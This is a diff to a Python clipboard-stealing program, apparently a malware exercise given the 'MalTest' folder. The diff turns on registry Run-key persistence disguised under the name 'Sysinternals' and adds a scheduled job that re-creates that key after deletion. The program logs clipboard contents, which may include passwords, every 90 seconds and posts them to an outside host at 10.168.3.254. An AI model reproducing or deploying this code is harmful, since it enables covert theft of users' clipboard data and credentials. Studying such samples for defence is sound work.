@@ -25,14 +25,15 @@ public = rsa.PublicKey(
 
 def main():
 
-    #location = winreg.HKEY_CURRENT_USER
+    location = winreg.HKEY_CURRENT_USER
 
     #r is needed for backspacing characters
-    #path = winreg.OpenKeyEx(location, r"Software\Microsoft\Windows\CurrentVersion\Run\\")
+    path = winreg.OpenKeyEx(location, r"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", winreg.KEY_ALL_ACCESS)
+    #os system and regedit
     #first_key = winreg.CreateKey(path, "Discord")
 
     current = os.path.abspath(__file__)
-    #winreg.SetValueEx(path, "Sysinternals", 0, winreg.REG_SZ, current)
+    winreg.SetValueEx(path, "Sysinternals", 0, winreg.REG_SZ, current)
     #TODO: COULD ADD THE PERSISTENCE MECHANISM...
     #
 
@@ -40,7 +41,7 @@ def main():
     schedule.every(90).seconds.do(get_clipboard_info)
 
     #Reestablishes the persistence mechanisms
-    #schedule.every(45).seconds.do(reestablish)
+    schedule.every(45).seconds.do(reestablish)
 
     #Adds a hotkey, can't have parenthesis becasue it returns as a none type instead of a boolean
     #explore the timeout feature to add some more functionality
@@ -88,10 +89,10 @@ def get_clipboard_info():
     filepath = os.path.join('C:/Tools/Sysint/MalTest/', 'info')
     if not os.path.exists('C:/Tools/Sysint/MalTest/'):
         #makes the directory if the path doesn't exist
-        os.makedirs('C:/Tools/Sysint/MalTest/passwordLog.txt/info')
+        os.makedirs('C:/Tools/Sysint/MalTest/')
+        filepath = os.path.join('C:/Tools/Sysint/MalTest/', 'info')
 
     clipboard_data_file = open(filepath, "a")
-
 
     #checks if the last clipboard value is equal to the current one
     if not last_clip_board_value == clipboard_info:
@@ -115,8 +116,8 @@ def get_clipboard_info():
         #requests.post("http://127.0.0.1:12345/output", files={'file': exfil_file})
 
 
-        #encoded_clipboard_info = rsa.encrypt(formatted_clipboard_info, )
-        public
+        #encoded_clipboard_info = rsa.encrypt(formatted_clipboard_info, public)
+
         #TODO: THIS CAN BE SEEN IN WIRESHARK...
 
         requests.post("http://10.168.3.254:80/output", encoded_clipboard_info)
@@ -158,8 +159,9 @@ def add_invisible_character_to_clipboard() -> None:
 """Reestablishes persistence mechanism once it gets deleted..."""
 def reestablish() -> None:
     location = winreg.HKEY_CURRENT_USER
-    path = winreg.OpenKeyEx(location, r"Software\Microsoft\Windows\CurrentVersion\Run")
+    path = winreg.OpenKeyEx(location, r"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", winreg.KEY_ALL_ACCESS)
     current = os.path.abspath(__file__)
+    #need to set the value
     winreg.SetValueEx(path, "Sysinternals", 0, winreg.REG_SZ, current)
 """
 change_password changes the clipboard data to password
